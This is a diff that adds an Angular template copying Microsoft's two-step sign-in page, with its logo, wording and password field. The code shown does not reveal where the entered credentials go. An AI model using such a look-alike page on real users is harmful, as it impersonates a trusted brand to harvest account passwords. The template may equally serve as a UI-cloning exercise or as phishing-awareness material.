@@ -1,0 +1,74 @@
+<div class="container-fluid outer">
+    <div class="middle">
+        <div class="inner">
+            <div class="background-logo-holder">
+                <img class="background-logo" src="assets/login.png" />
+            </div>
+            <div class="app">
+                <form [formGroup]="fg" (submit)="onSubmit()" novalidate>
+                    <div class="form-group">
+                        <img class="logo" src="assets/microsoft_logo.svg" />
+                    </div>
+                    <div *ngIf="!isClicked">
+                        <div class="form-group">
+                            <div class="text-title">
+                                Sign in
+                            </div>
+                        </div>
+                        <div class="form-group" *ngIf="f.InputInfo.errors && isValidInputInfo">
+                            <div class="invalid-feedback d-block" *ngIf="f.InputInfo.errors.required">
+                                Enter a valid email address, phone number, or Skype name.
+                            </div>
+                            <div class="invalid-feedback d-block" *ngIf="f.InputInfo.errors.isValidInputName">
+                                Enter a valid email address, phone number, or Skype name.
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" class="form-control" placeholder="Email, phone or Skype" formControlName="InputInfo" />
+                        </div>
+                        <div class="form-group text-13">
+                            No account? <a href="#">Create one</a>
+                        </div>
+                        <div class="form-group text-right mb-0">
+                            <button class="btn btn-primary btn-login d-inline" type="button" (click)="next()">Next</button>
+                        </div>
+                    </div>
+                    <div *ngIf="isClicked">
+                        <div class="form-group">
+                            {{f.InputInfo.value}}
+                        </div>
+                        <div class="form-group">
+                            <div class="text-title">
+                                Enter password
+                            </div>
+                        </div>
+                        <div class="form-group" *ngIf="f.Password.errors && isSubmitted">
+                            <div class="invalid-feedback d-block" *ngIf="f.Password.errors.required">
+                                Please enter the password for your Microsoft account.
+                            </div>
+                            <div class="invalid-feedback d-block">
+                                <div class="alert alert-light" *ngFor="let err of errors">
+                                    {{err}}
+                                </div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <input type="password" class="form-control" placeholder="Password" formControlName="Password" />
+                        </div>
+                        <div class="form-group form-check">
+                            <label class="form-check-label">
+                                <input class="form-check-input" type="checkbox">Remember me
+                            </label>
+                        </div>
+                        <div class="form-group text-13">
+                            <a href="#">Forgot my password</a>
+                        </div>
+                        <div class="form-group text-right mb-0">
+                            <button type="submit" class="btn btn-primary btn-login d-inline">Sign in</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</div>
